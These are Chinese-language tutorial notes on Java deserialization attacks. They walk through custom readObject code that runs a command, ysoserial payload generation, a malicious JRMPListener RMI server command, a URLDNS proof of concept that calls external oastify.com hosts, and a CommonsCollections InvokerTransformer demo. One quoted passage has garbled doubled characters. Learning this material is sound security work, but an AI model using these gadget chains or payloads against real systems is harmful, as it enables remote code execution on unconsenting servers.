## 前言
Java在序列化时一个对象，将会调用这个对象中的 `writeObject` 方法，参数类型是 `ObjectOutputStream` ，开发者可以将任何内容写入这个`stream`中；反序列化时，会调用 `readObject` ，开发者也可以从中读取出前面写入的内容，并进行处理。
例如
```java
  
import java.io.IOException;  
public class Person implements java.io.Serializable {//实现Serializable接口  
    public String name;  
    public int age;  
    Person(String name, int age) {  
        this.name = name;  
        this.age = age;  
    }  
    private void writeObject(java.io.ObjectOutputStream s) throws IOException {//自定义序列化  
        s.defaultWriteObject();//先序列化默认字符串  
        s.writeObject("This is a object");//再额外写入一个字符串  
    }  
    private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {  
        s.defaultReadObject();//先读取默认字段  
        String message = (String) s.readObject();//读取额外写入的字段  
        System.out.println(message);  
    }  
}
```
序列化操作
```java
import java.io.*;  
  
public class SerializeDemo {  
    public static void main(String[] args) throws Exception {  
        Person person = new Person("Alice", 25);  
  
        // 序列化 → 写入文件  
        ObjectOutputStream oos = new ObjectOutputStream(  
                new FileOutputStream("person.ser")  
        );  
        oos.writeObject(person);  
        oos.close();  
        System.out.println("序列化完成 → person.ser");  
  
        // ✅ 修正：直接读刚写好的文件  
        FileInputStream fis = new FileInputStream("person.ser");  
        byte[] data = fis.readAllBytes();  
        fis.close();  
  
        // 打印 HEX        StringBuilder hex = new StringBuilder();  
        for (byte b : data) {  
            hex.append(String.format("%02X ", b));  
        }  
        System.out.println("HEX: " + hex);  
        System.out.println("文件大小: " + data.length + " bytes");  
    }  
}
```
在执行完默认的 s.defaultWriteObject() 后，我向stream里写入了一个字符串 This is a object 。我们用上一章讲的工具SerializationDumper查看此时生成的序列化数据：
```bash
D:\CTF_tools\SerializationDumper>java -jar SerializationDumper-v1.14.jar "ACED000573720006506572736F6E9F539909112B2FD50300024900036167654C00046E616D657400124C6A6176612F6C616E672F537472696E673B787000000019740005416C696365740010546869732069732061206F626A65637478"

STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 6 - 0x00 06
        Value - Person - 0x506572736f6e
      serialVersionUID - 0x9f 53 99 09 11 2b 2f d5
      newHandle 0x00 7e 00 00
      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE
      fieldCount - 2 - 0x00 02
      Fields
        0:
          Int - I - 0x49
          fieldName
            Length - 3 - 0x00 03
            Value - age - 0x616765
        1:
          Object - L - 0x4c
          fieldName
            Length - 4 - 0x00 04
            Value - name - 0x6e616d65
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 01
              Length - 18 - 0x00 12
              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 02
    classdata
      Person
        values
          age
            (int)25 - 0x00 00 00 19
          name
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 03
                Length - 5 - 0x00 05
                Value - Alice - 0x416c696365
        objectAnnotation
          TC_STRING - 0x74
            newHandle 0x00 7e 00 04
            Length - 16 - 0x00 10
            Value - This is a object - 0x546869732069732061206f626a656374
          TC_ENDBLOCKDATA - 0x78
```
可见，我们写入的字符串 `This is a object` 被放在 `objectAnnotation` 的位置。
在反序列化时，我读取了这个字符串，并将其输出：
## 漏洞成因
Java中间件通常通过网络接收客户端发送的序列化数据,而在服务端对序列化数据进行反序列化时,会调用被序列化对象的readObject()方法.而在Java中如果重写了某个类的方法,就会优先调用经过修改后的方法.如果某个对象重写了readObject()方法,且在方法中能够执行任意代码,那服务端在进行反序列化时,也会执行相应代码。
java反序列化在思想上和php反序列化很像。但是也又区别。
在php中序列化是将对象等转换成了字符串,而在Java中则是转换成了字节流。
```java
public class Demo {  
    public static void main() throws  Exception {  
        Runtime.getRuntime().exec("calc");  
    }  
}
```
 Java中执行系统命令使用java.lang.Runtime类的exec方法 以上函数可以弹出计算器 `getRuntime()`是Runtime类中的静态方法,使用此方法获取当前java程序的Runtime(即运行时:计算机程序运行需要的代码库,框架,平台等) exec底层为ProcessBuilder:此类用于创建操作系统进程 每个ProcessBuilder实例管理进程属性的集合。start()方法使用这些属性创建一个新的Process实例。start()方法可以从同一实例重复调用，以创建具有相同或相关属性的新子进程。 
 
 注意:这里的命令执行,并不是使用系统中的bash或是cmd进行的系统命令执行,而是使用JAVA本身,所以反弹shell的重定向符在JAVA中并不支持
## 编写一个可以序列化的类
在Java当中,如果一个类需要被序列化和反序列化 ,需要实现java.io.Serializable接口  
也就是让他 implements Serializeable

同时，被transient修饰的属性也不参与序列化过程
```java
package test;  
  
  
import java.io.ObjectInputStream;  
import java.io.Serializable;  
import java.io.IOException;  
  
public class Person implements Serializable {  
    private static final long serialVersionUID = 1L;  
    //添加一个 transient 关键字,则name属性不会被序列化和反序列化  
    //如果将属性设置为static,同样不会被序列化和反序列化  
    //private transient String name;  
    public String name;  
    private int age;  
    public Person(){  
  
    }  
    public Person(String name, int age){  
        this.name = name;  
        this.age = age;  
    }  
    /*  
     * @Override是Java5的元数据,自动加上去的一个标志,告诉你说下面这个方法是从父类/接口  
     * 继承过来的,需要你重写一次,这样就可以方便你阅读,也不怕会忘记  
     * @Override是伪代码,表示重写(当然不写也可以),不过写上有如下好处:  
     * 1. 可以当注释用,方便阅读  
     * 2. 编译器可以给你验证@Override下面的方法名是否是你父类中所有的,如果没有则报错  
     * 比如你如果没写@Override而你下面的方法名又写错了,这时你的编译器是可以通过的(它以为这个方法是你的子类中自己增加的方法)  
     * 使用该标记是为了增强程序在编译时候的检查,如果该方法并不是一个覆盖父类的方法,在编译时编译器就会报告错误  
     */    @Override  
    public String toString(){  
        return "Person [name=" + name + ", age=" + age + "]";  
    }  
    private void readObject(ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {  
        /*  
         * java.io.ObjectInputStream.defaultReadObject()         * 方法用于从这个ObjectInputStream读取当前类的非静态和非瞬态字段.它间接地涉及到该类的readObject()方法的帮助.  
         * 如果它被调用,则会抛出NotActiveException  
         */        objectInputStream.defaultReadObject();  
        /*  
         * 每个Java应用程序都有一个Runtime类的Runtime ,允许应用程序与运行应用程序的环境进行接口.当前运行时可以从getRuntime方法获得.  
         */        /*         * exec:在具有指定环境的单独进程中执行指定的字符串命令.  
         * 这是一种方便的方法. 调用表单exec(command, envp)的行为方式与调用exec(command, envp, null)完全相同 .         */        Runtime.getRuntime().exec("calc");  
    }  
}
```
Ctrl+click 跟进java.io.Serializable接口
发现
```java
public interface Serializable {  
}
```
发现是一个空接口,说明其作用只是为了在序列化和反序列化中做了一个类型判断.为什么呢?因为需要遵循非必要原则,不需要反序列化的类就可以不用序列化了
## 如何序列化类
Java原生实现了一套序列化的机制,它让我们不需要额外编写代码,只需要实现java.io.Serializable接口,并调用ObjectOutputStream类的writeObject方法即可
```java
package test;  
  
import java.io.FileOutputStream;  
import java.io.ObjectOutputStream;  
import java.io.IOException;  
  
public class serialize {  
    public static void main(String[] args) throws IOException {  
        //生成Person对象的实例  
        Person p = new Person("Tom", 18);  
        /*  
         * ObjectOutputStream将Java对象的原始数据类型和图形写入OutputStream.可以使用ObjectInputStream读取（重构）  
         * 对象.可以通过使用流的文件来实现对象的持久存储.如果流是网络套接字流,则可以在另一个主机上或另一个进程中重构对象.  
         */        /*         * 文件输出流是用于将数据写入到输出流File或一个FileDescriptor  
         * .文件是否可用或可能被创建取决于底层平台.特别是某些平台允许一次只能打开一个文件来写入一个FileOutputStream  
         * （或其他文件写入对象）.在这种情况下,如果所涉及的文件已经打开,则此类中的构造函数将失败.  
         * FileOutputStream用于写入诸如图像数据的原始字节流. 对于写入字符流,请考虑使用FileWriter .  
         */        //序列化的类  
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("ser.ser"));  
        /*  
         * 方法writeObject用于将一个对象写入流中. 任何对象,包括字符串和数组,都是用writeObject编写的. 多个对象或原语可以写入流.  
         * 必须从对应的ObjectInputstream读取对象,其类型和写入次序相同.  
         */        // 需要序列化的对象是谁?  
        out.writeObject(p);  
        out.close();  
    }  
}
```
跟进writeObject函数,我们通过阅读他的注释可知:
在反序列化的过程当中,是针对对象本身,而非针对类的,因为静态属性是不参与序列化和反序列化的过程的.另外,如果属性本身声明了transient关键字,也会被忽略.但是如果某对象继承了A类,那么A类当中的对象的对象属性也是会被序列化和反序列化的(前提是A类也实现了java.io.Serializable接口)
## 如何反序列化类
序列化使用ObjectOutPutStream类,反序列化使用的则是ObjectInputStream类的readObject方法.

由于我们在之前在Person类中重写了readObject方法，所以会调用java.lang.Runtime类的exec方法执行calc命令
```java
package test;  
import java.io.FileInputStream;  
import java.io.IOException;  
import java.io.ObjectInputStream;  
  
public class unserialize {  
    public static void main(String[] args) throws IOException, ClassNotFoundException {  
        /*  
         * ObjectInputStream反序列化先前使用ObjectOutputStream编写的原始数据和对象.  
         * ObjectOutputStream和ObjectInputStream可以分别为与FileOutputStream和FileInputStream一起使用的对象图提供持久性存储的应用程序.  
         * ObjectInputStream用于恢复先前序列化的对象. 其他用途包括使用套接字流在主机之间传递对象,或者在远程通信系统中进行封送和解组参数和参数.  
         * ObjectInputStream确保从流中创建的图中的所有对象的类型与Java虚拟机中存在的类匹配. 根据需要使用标准机制加载类.  
         * 只能从流中读取支持java.io.Serializable或java.io.Externalizable接口的对象.  
         */        // 反序列化的类  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("ser.ser"));  
        /*  
         * 方法readObject用于从流中读取对象. 应使用Java的安全铸造来获得所需的类型. 在Java中,字符串和数组是对象,在序列化过程中被视为对象.  
         * 读取时,需要将其转换为预期类型.  
         */        // 读出来并反序列化  
        Person person = (Person) ois.readObject();  
        System.out.println(person);  
        ois.close();  
    }  
}
```
执行，弹出来了计算器，，，
同时，我们unserialize.java里， `Person person = (Person) ois.readObject();` 成功讲unserialize.java里的 实例化的person对象接收了过来。
## serialVersionUID讲解
序列化和反序列化可以理解为压缩和解压缩,但是压缩之所以能被解压缩的前提是因为他俩的协议是一样的.如果压缩是以四个字节为一个单位,而解压缩以八个字节为一个单位,就会乱套
同样在Java中与协议相对的概念为:serialVersionUID
当serialVersionUID不一致时,反序列化会直接抛出异常
比如设置为2L时序列化,修改为1L时反序列化,则会抛出异常

## ysoserial
Java反序列化和php相同的是，php反序列化通过POP链最终要找到一个落脚点（RCE），这个落脚点一般都是开发自己写的。java通过gadget也要找一个落脚点，而这个落脚点在java标准库和一些常用库就有
ysoserial上就集成了各种常用gadget，其中最简单的就是URLDNS
它可以让⽤用户根据⾃自⼰己选择的利利⽤用链，⽣生成反 序列列化利利⽤用数据，通过将这些数据发送给⽬目标，从⽽而执⾏行行⽤用户预先定义的命令。
利利⽤用链也叫“gadget chains”，我们通常称为gadget。ysoserial的使⽤用也很简单，虽然我们暂时先不不理理解 CommonsCollections ，但是⽤用ysoserial可以很容 易易地⽣生成这个gadget对应的POC：
```bash
java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 "id"
```
如上，ysoserial⼤大部分的gadget的参数就是⼀一条命令，⽐比如这⾥里里是 id 。⽣生成好的POC发送给⽬目标，如 果⽬目标存在反序列列化漏漏洞洞，并满⾜足这个gadget对应的条件，则命令 id 将被执⾏行行。
用法：`java -jar ysoserial.jar` 就可以看到有哪些gadget，它们适合的扩展库或者JDK版本
![](photo/Pasted%20image%2020260325162528.png)
假设上面演示生成的 ser.ser这个文件路径我们可控，我们可以构造出一个恶意反序列化文件，来进行DNS查询
去DNSlog申请一个域名：（我的DNS打不开，就用了bp的一个功能）
```
java -jar ysoserial.jar URLDNS "http://omegzj1miplgzds21pdlhm8pigo7cx0m.oastify.com">ser.ser
```
然后执行
```java
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class unserialize {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        // 反序列化的类
        ObjectInputStream ois = new ObjectInputStream((new FileInputStream("ser.ser")));
        // 读出来并反序列化
        ois.readObject();
        ois.close();
    }
}
```
![](photo/Pasted%20image%2020260325163829.png)
绝大部分反序列化漏洞都是这样生成payload并利用的，只不过ser.ser可能需要经过复杂编码，或者藏在RMI服务中使用。

比如：更常用的CommonsCollections4。  
`java -jar ysoserial.jar CommonsCollections4 "ping dnslog.cn"`  
起一个恶意RMI服务，一旦有人连接它，就发送恶意反序列化字节的payload  
`java -cp ysoserial.jar ysoserial.exploit.JRMPListener 5555 CommonsCollections4 " ping dnslog.cn "`  
接下我们通过对URLDNS的分析来了解具体是如何造成危害的

## URLDNS链分析
```
URLDNS链是java原生态的一条利用链, 通常用于存在反序列化漏洞进行验证的,因为是原生态,不存在什么版本限制.  
HashMap结合URL触发DNS检查的思路.在实际过程中可以首先通过这个去判断服务器是否使用了readObject()以及能否执行.之后再用各种gadget去尝试RCE.  
HashMap最早出现在JDK 1.2中, 底层基于散列算法实现.而正是因为在HashMap中,Entry的存放位置是根据Key的Hash值来计算,然后存放到数组中的.所以对于同一个Key, 在不同的JVM实现中计算得出的Hash值可能是不同的.因此,HashMap实现了自己的writeObject和readObject方法
```
链子利用思路：

1. 首先找到Sink:发起DNS请求的URL类hashCode方法
2. 看谁能调用URL类的hashCode方法(找gadget),发现HashMap行(他重写了hashCode方法,执行了Map里面key的hashCode方法,HashMap而key的类型可以是URL类),而且HashMap的readObject方法直接调用了hashCode方法
3. EXP的思路就是创建一个HashMap,往里面丢一个URL当key,然后序列化它
4. 在反序列化的时候自然就会执行HashMap的readObject->hashCode->URL的hashCode->DNS请求
### 调试分析
Gadget Chain：  
Deserializer.deserialize() -> HashMap.readObject() -> HashMap.putVal() -> HashMap.hash() ->URL.hashCode() ->  
getHostAddress()  
在getHostAddress函数中进行域名解析，从而可以被DNSLog平台捕获
### URLDNS程序入口
在`ysoserial-master\src\main\java\ysoserial\payloads\URLDNS.java`路径下有`URLDNS.java`文件
`main`主函数的`[run函数]打断点进入`
![](photo/Pasted%20image%2020260325165917.png)
这个`ysoserial-master`的`payload`运行结构大致是有一个专门的`PayloadRunner`运行程序，然后统一调用来运行各部分的`payload`

首先是进行序列化：
![](photo/Pasted%20image%2020260325170527.png)


![](photo/Pasted%20image%2020260325170709.png)
继续往下，生成`command`，由于是分析`URLDNS`攻击链，所以只需要修改将返回值为`dnslog`的临时地址
![](photo/Pasted%20image%2020260325171044.png)
创建实例后，进入到`URLDNS`的`getObject`的`payload`函数
![](photo/Pasted%20image%2020260325171300.png)
getObject函数中应该注意的是：声明了HashMap对象和URL对象，并进行put哈希绑定，最后设置作用域
![](photo/Pasted%20image%2020260325171458.png)

![](photo/Pasted%20image%2020260325171634.png)
### 反序列化链子
在反序列化入口处打断点：
![](photo/Pasted%20image%2020260325171920.png)
在反序列化时调用了`readObject`函数
![](photo/Pasted%20image%2020260325172103.png)
然后进入`HashMap.java`的`readObject`函数
![](photo/Pasted%20image%2020260325172723.png)
在`readObject`中调试到此行，了`putval`，在此处`IDEA`这个`IDE`可以选择进入的函数，直接进入后者`hash`
由于我们读入字节序列，需要将其恢复成相应的对象结构，那么就需要重新`putval`
![](photo/Pasted%20image%2020260325173302.png)
传入的`key`不为空，执行`key.hashCode`
![](photo/Pasted%20image%2020260325174645.png)

进一步在`URL.java`文件下
![](photo/Pasted%20image%2020260325175715.png)

进入`URLStreamHandler`的`hashCode`
![](photo/Pasted%20image%2020260325175859.png)


![](photo/Pasted%20image%2020260325180344.png)

![](photo/Pasted%20image%2020260325180453.png)
产生解析：
![](photo/Pasted%20image%2020260325180522.png)
总的来说，利用链思路如下：  
在反序列化URLDNS对象时，也需要反序列化HashMap对象，从而调用了HashMap.readObject()的重写函数，重写函数中调用了哈希表putval等的相关[重构函数](https://zhida.zhihu.com/search?content_id=231088351&content_type=Article&match_order=1&q=%E9%87%8D%E6%9E%84%E5%87%BD%E6%95%B0&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NzQ2MDE1MjAsInEiOiLph43mnoTlh73mlbAiLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyMzEwODgzNTEsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.zt7OroeRETsSwoM4uEn8U04tLL4ZzY7lhGm60NT2XnM&zhida_source=entity)，在hashcode下调用了getHostAddress函数  
那么反之，为什么首次声明的时候没有调用到了getHostAddress函数，现在给出声明时的函数路线：  
`ht.put()` --> .. --> `SilentURLStreamHandler.getHostAddress()`  
该函数为空实现
具体链子
```
链子如下：`HashMap.readObject()->HashMap.hash()->URL.hashCode()->URLStreamHandler.hashCode()->URLStreamHandler.getHostAddress()`
```
### URLDNS链的使用POC
```java
package urldns;  
  
import java.io.Serializable;  
import java.lang.reflect.Field;  
import java.net.URL;  
import java.util.HashMap;  
import java.io.FileInputStream;  
import java.io.FileOutputStream;  
import java.io.ObjectInputStream;  
import java.io.ObjectOutputStream;  
  
public class Dnstest {  
    public static void main(String[] args) throws Exception {  
        HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();  
        URL url = new URL("http://jnab0e2hjkmb08tx2kegih9kjbp4dz1o.oastify.com");  
        Class c = URL.class;  
        Field fieldhashcode = c.getDeclaredField("hashCode");  
        fieldhashcode.setAccessible(true);  
        // 发现在生成过程中,dnslog就收到了请求,并且在反序列过程后dnslog不在收到新的请求,这显然不符合我们的期望  
        // 原因是在put的过程中hashMap类就调用了hash方法,并且在hash方法中判断hashcode不为初始化的值(-1)时会直接  
        // 返回,由于在序列化的时候已经进行了hashCode计算,那么在反序列化时hashCode值就不是-1了。就不会走到他真正的handler.hashCode方法里  
        // 所以在hashmap.put()前 需要修改URL类hashCode值不为-1  
        fieldhashcode.set(url, 1);  
        hashmap.put(url, 22);  
        // 反序列化之后还是需要让他发送请求,所以需要改回来  
        // 这是为了防止我们把put的时候发送的DNS请求误以为是反序列化时的readObject去发的DNS请求  
        fieldhashcode.set(url, -1);  
        Serializable(hashmap);  
  
    }  
    public static void Serializable(Object  obj) throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.ser"));  
        oos.writeObject(obj);  
        oos.close();  
    }  
}
```
这个代码在高版本jdk运行有一点问题，报错Unable to make field private int java.net.URL.hashCode accessible: module java.base does not "opens java.net" to unnamed module @8efb846
需要在 IDEA 中添加 JVM 启动参数
```
--add-opens java.base/java.net=ALL-UNNAMED
```
![](photo/Pasted%20image%2020260325200809.png)

![](photo/Pasted%20image%2020260325200829.png)

![](photo/Pasted%20image%2020260325200844.png)

![](photo/Pasted%20image%2020260325200857.png)
这样再运行就不会报错了。
生成ser.ser文件之后 反序列化调用
```java
package urldns;  
  
import java.io.FileInputStream;  
import java.io.IOException;  
import java.io.ObjectInputStream;  
  
public class test {  
    public static void main(String[] args) throws IOException,ClassNotFoundException {  
        //反序列化的类  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("ser.ser"));  
        //读出来并反序列化  
        ois.readObject();  
        ois.close();  
    }  
}
```
这样就可以发送DNS请求
![](photo/Pasted%20image%2020260325201532.png)
为什么 new出来了URL类实例url，还需要用反射机制呢？因为反射更灵活 URL类里 hashCode是private属性，无法直接设置，但是可以通过反射来设置。

通过反射的方式，先将url对象的hashCode设置为1，这样在hashmap.put(url,22)的时候可以跳过DNS查询，put URL和22 url实例赋给了hashmap的key，再通过反射将url对象的hashCode设置为-1，然后讲hashmap对象序列化写入二进制文件ser.ser，最终反序列化的时候进行了DNS查询 注：hashmap的key和 url对象指向的是同一对象，因此我们后面再通过反射将url对象的hashCode设置为-1时，hashmap里key(URL对象)的hashCode也会变成-1.


![](photo/Pasted%20image%2020260325203454.png)


## CommonCollections
简单的demo
```java
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
import java.util.HashMap;  
import java.util.Map;  
public class CommonCollections1 {  
    public static void main(String[] args) throws Exception {  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.getRuntime()),  
                new InvokerTransformer("exec", new Class[]{String.class},  
                        new Object[]  
                                {"C:\\Windows\\System32\\calc.exe"}),  
        };  
        Transformer transformerChain = new  
                ChainedTransformer(transformers);  
        Map innerMap = new HashMap();  
        Map outerMap = TransformedMap.decorate(innerMap, null,  
                transformerChain);  
        outerMap.put("test", "xxxx");  
    }  
}
```
这个代码运行就会弹出计算器。
这个过程涉及到如下几个接口和类。
### TransformedMap
TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可 以执⾏⼀个回调。我们通过下⾯这⾏代码对innerMap进⾏修饰，传出的outerMap即是修饰后的Map：
```java
Map outerMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);
```
其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。 我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了Transformer接⼝的类。
### Transformer
Transformer是⼀个接⼝，它只有⼀个待实现的⽅法：
```java
public interface Transformer { public Object transform(Object input); }
```
TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个”回调 函数“，这个回调的参数是原始对象。
### ConstantTransformer
ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个 对象，并在transform⽅法将这个对象再返回：
```java
public ConstantTransformer(Object constantToReturn) { 
	super(); 
	iConstant = constantToReturn; 
} 
public Object transform(Object input) { 
	return iConstant; 
}
```
所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。
### InvokerTransformer
InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序 列化能执⾏任意代码的关键。
在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数 是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表
```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { 
	super(); 
	iMethodName = methodName; 
	iParamTypes = paramTypes; 
	iArgs = args; 
}
```
后⾯的回调transform⽅法，就是执⾏了input对象的iMethodName⽅法：
```java
public Object transform(Object input) {  
    if (input == null) {  
        return null;  
    }  
    try {  
        Class cls = input.getClass();  
        Method method = cls.getMethod(iMethodName, iParamTypes);  
        return method.invoke(input, iArgs);  
    } catch (NoSuchMethodException ex) {  
        throw new FunctorException("InvokerTransformer: The method '" +  
                iMethodName + "' on '" + input.getClass() + "' does not exist");  
    } catch (IllegalAccessException ex) {  
        throw new FunctorException("InvokerTransformer: The method '" +  
                iMethodName + "' on '" + input.getClass() + "' cannot be accessed");  
    } catch (InvocationTargetException ex) {  
        throw new FunctorException("InvokerTransformer: The method '" +  
                iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);  
    }  
}
```
### ChainedTransformer
ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串 在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，
它的代码也⽐较简单：
```java
public ChainedTransformer(Transformer[] transformers) {  
    super();  
    iTransformers = transformers;  
}  
public Object transform(Object object) {  
    for (int i = 0; i < iTransformers.length; i++) {  
        object = iTransformers[i].transform(object);  
    }  
    return object;  
}
```
### 理解demo
了解了这⼏个Transformer的意义以后，我们再回头看看demo的代码。 这两段代码就⽐较好理解了：
```java
Transformer[] transformers = new Transformer[]{  
        new ConstantTransformer(Runtime.getRuntime()),  
        new InvokerTransformer("exec", new Class[]{String.class},  
                new Object[]  
                        {"calc"}),  
};  
Transformer transformerChain = new  
        ChainedTransformer(transformers);
```
我创建了⼀个ChainedTransformer，其中包含两个Transformer：第⼀个是ConstantTransformer， 直接返回当前环境的Runtime对象；第⼆个是InvokerTransformer，执⾏Runtime对象的exec⽅法，参 数是`calc`
当然，这个transformerChain只是⼀系列回调，我们需要⽤其来包装innerMap，使⽤的前⾯说到的 `TransformedMap.decorate` ：
```java
Map innerMap = new HashMap(); 
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
```
最后，怎么触发回调呢？就是向Map中放⼊⼀个新的元素
```java
outerMap.put("test", "xxxx");
```
## ⽣成⼀个可利⽤的序列化对象
当然，上⾯的代码执⾏demo，它只是⼀个⽤来在本地测试的类。在实际反序列化漏洞中，我们需要将 上⾯最终⽣成的outerMap对象变成⼀个序列化流。
### AnnotationInvocationHandler
我们前⾯说过，触发这个漏洞的核⼼，在于我们需要向Map中加⼊⼀个新的元素。在demo中，我们可 以⼿⼯执⾏ outerMap.put("test", "xxxx"); 来触发漏洞，但在实际反序列化时，我们需要找到⼀ 个类，它在反序列化的readObject逻辑⾥有类似的写⼊操作。
这个类就是 `sun.reflect.annotation.AnnotationInvocationHandler` ，我们查看它的readObject ⽅法（这是8u71以前的代码，8u71以后做了⼀些修改，这个后⾯再说）：





## 参考
https://www.cnblogs.com/1vxyz/p/17231164.html
java安全漫谈
https://zhuanlan.zhihu.com/p/643310278